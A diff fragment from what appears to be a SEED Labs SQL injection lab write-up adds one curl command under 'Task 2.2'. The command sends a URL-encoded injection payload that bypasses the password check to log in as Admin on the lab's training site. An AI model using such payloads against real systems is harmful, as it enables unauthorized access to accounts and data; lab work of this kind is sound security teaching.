@@ -47,6 +47,7 @@ Figure 2
 
 ### Task 2.2: SQL Injection Attack from command line 
 
+curl 'http://www.seedlabsqlinjection.com/unsafe_credential.php?EID=a+%27+or+Name%3D%27Admin%27+%23&Password=aass'
 
 ### Task 2.3: Append a new SQL statement. 
 
